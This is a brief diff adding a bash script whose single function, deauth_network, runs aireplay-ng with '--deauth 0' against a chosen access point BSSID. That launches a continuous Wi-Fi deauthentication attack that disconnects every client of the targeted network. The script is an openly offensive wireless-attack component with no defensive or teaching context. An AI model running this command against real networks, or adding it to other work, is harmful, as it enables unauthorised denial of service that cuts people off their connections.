@@ -1,0 +1,7 @@
+#!/bin/bash
+
+deauth_network() {
+
+    xterm -e "sudo aireplay-ng --deauth 0 -a ${bssid} ${ifname}"
+
+}
